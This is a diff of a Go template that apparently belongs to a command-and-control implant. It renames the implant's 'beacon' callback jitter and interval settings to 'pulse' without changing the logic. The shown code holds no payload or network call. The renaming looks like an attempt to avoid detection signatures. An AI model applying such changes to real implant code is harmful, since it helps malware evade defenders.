@@ -150,7 +150,7 @@ var (
 	// reconnectInterval - DO NOT ACCESS DIRECTLY
 	reconnectInterval = time.Duration(0)
 
-	// {{if .Config.IsBeacon}}
+	// {{if .Config.IsPulse}}
 	jitter   = time.Duration(0)
 	interval = time.Duration(0)
 	// {{end}}
@@ -174,10 +174,10 @@ func SetReconnectInterval(interval int64) {
 	reconnectInterval = time.Duration(interval)
 }
 
-// GetJitter - Get the beacon jitter {{if .Config.IsBeacon}}
+// GetJitter - Get the pulse jitter {{if .Config.IsPulse}}
 func GetJitter() int64 {
 	if jitter == time.Duration(0) {
-		configJitter, err := strconv.ParseInt(`{{.Config.BeaconJitter}}`, 10, 64)
+		configJitter, err := strconv.ParseInt(`{{.Config.PulseJitter}}`, 10, 64)
 		jitter = time.Duration(configJitter)
 		if err != nil {
 			jitter = time.Duration(30 * time.Second)
@@ -191,12 +191,12 @@ func SetJitter(newJitter int64) {
 	jitter = time.Duration(newJitter)
 }
 
-// {{end}} - IsBeacon
+// {{end}} - IsPulse
 
-// GetInterval - Get the beacon interval {{if .Config.IsBeacon}}
+// GetInterval - Get the pulse interval {{if .Config.IsPulse}}
 func GetInterval() int64 {
 	if interval == time.Duration(0) {
-		configInterval, err := strconv.ParseInt(`{{.Config.BeaconInterval}}`, 10, 64)
+		configInterval, err := strconv.ParseInt(`{{.Config.PulseInterval}}`, 10, 64)
 		if err != nil {
 			interval = time.Duration(30 * time.Second)
 		}
@@ -210,7 +210,7 @@ func SetInterval(newInterval int64) {
 	interval = time.Duration(newInterval)
 }
 
-// {{end}} - IsBeacon
+// {{end}} - IsPulse
 
 // GetMaxConnectionErrors - Parse the max connection errors inserted at compile-time
 func GetMaxConnectionErrors() int {
